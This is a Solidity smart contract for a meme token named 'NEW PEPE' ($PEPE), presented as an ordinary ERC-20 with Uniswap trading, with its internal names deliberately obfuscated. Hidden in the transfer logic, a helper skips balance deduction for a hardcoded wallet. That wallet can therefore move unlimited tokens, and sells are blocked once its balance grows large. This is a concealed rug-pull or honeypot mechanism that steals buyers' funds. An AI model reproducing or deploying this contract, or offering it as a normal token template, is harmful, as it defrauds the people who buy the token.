/*

NEW PEPE   $PEPE


Twitter: https://twitter.com/NewPepe_Partal
Telegram: https://t.me/NewPepe_Partal
Website: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rkcqv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rkcqv(a, b, "SafeMath");
    }

    function  _rkcqv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NEWPEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dogfaqj;
    address payable private _tysokjh;
    address private _rkrobp;

    string private constant _name = unicode"NEW PEPE";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evgjfa;
    mapping (address => bool) private _virqay;
    mapping(address => uint256) private _fnqafx;
    uint256 public _qfabsp = _totalSupply;
    uint256 public _drkrje = _totalSupply;
    uint256 public _kquldv= _totalSupply;
    uint256 public _vspoif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ybufvj=0;
    uint256 private _eyfzoy=0;
    

    bool private _prlhot;
    bool public _ufrveq = false;
    bool private wyilep = false;
    bool private _oeveb = false;


    event _pweijh(uint _qfabsp);
    modifier rsounpr {
        wyilep = true;
        _;
        wyilep = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evgjfa[owner(

        )] = true;
        _evgjfa[address
        (this)] = true;
        _evgjfa[
            _tysokjh] = true;
        _tysokjh = 
        payable (0xD984653599E77015a273d28ec473F89367167F4B);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rkcqv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kwpakb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ufrveq) {
                if (to 
                != address
                (_dogfaqj) 
                && to !=
                 address
                 (_rkrobp)) {
                  require(_fnqafx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqafx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkrobp && to != 
            address(_dogfaqj) &&
             !_evgjfa[to] ) {
                require(amount 
                <= _qfabsp,
                 "Exceeds the _qfabsp.");
                require(balanceOf
                (to) + amount
                 <= _drkrje,
                  "Exceeds the _drkrje.");
                if(_eyfzoy
                < _ybufvj){
                  require
                  (! _ralcqr(to));
                }
                _eyfzoy++;
                 _virqay
                 [to]=true;
                kwpakb = amount._pvr
                ((_eyfzoy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkrobp &&
             from!= address(this) 
            && !_evgjfa[from] ){
                require(amount <= 
                _qfabsp && 
                balanceOf(_tysokjh)
                <_vspoif,
                 "Exceeds the _qfabsp.");
                kwpakb = amount._pvr((_eyfzoy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eyfzoy>
                _ybufvj &&
                 _virqay[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!wyilep 
            && to == _rkrobp &&
             _oeveb &&
             contractTokenBalance>
             _kquldv 
            && _eyfzoy>
            _ybufvj&&
             !_evgjfa[to]&&
              !_evgjfa[from]
            ) {
                _transferFrom( _vjgfp(amount, 
                _vjgfp(contractTokenBalance,
                _vspoif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prwlph(address
                    (this).balance);
                }
            }
        }

        if(kwpakb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kwpakb);
          emit
           Transfer(from,
           address
           (this),kwpakb);
        }
        _balances[from
        ]= _rkcqv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rkcqv(kwpakb));
        emit Transfer
        (from, to, 
        amount.
         _rkcqv(kwpakb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rsounpr {
        if(tokenAmount==
        0){return;}
        if(!_prlhot)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dogfaqj.WETH();
        _approve(address(this),
         address(
             _dogfaqj), 
             tokenAmount);
        _dogfaqj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _vjgfp
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rkcqv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tysokjh){
            return a ;
        }else{
            return a .
             _rkcqv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qfabsp = _totalSupply;
        _drkrje = _totalSupply;
        emit _pweijh(_totalSupply);
    }

    function _ralcqr(address 
    account) private view 
    returns (bool) {
        uint256 ekfrhb;
        assembly {
            ekfrhb :=
             extcodesize
             (account)
        }
        return ekfrhb > 
        0;
    }

    function _prwlph(uint256
    amount) private {
        _tysokjh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _prlhot ) ;
        _dogfaqj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dogfaqj), 
            _totalSupply);
        _rkrobp = 
        IUniswapV2Factory(_dogfaqj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dogfaqj .
             WETH ( ) );
        _dogfaqj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkrobp).
        approve(address(_dogfaqj), 
        type(uint)
        .max);
        _oeveb = true;
        _prlhot = true;
    }

    receive() external payable {}
}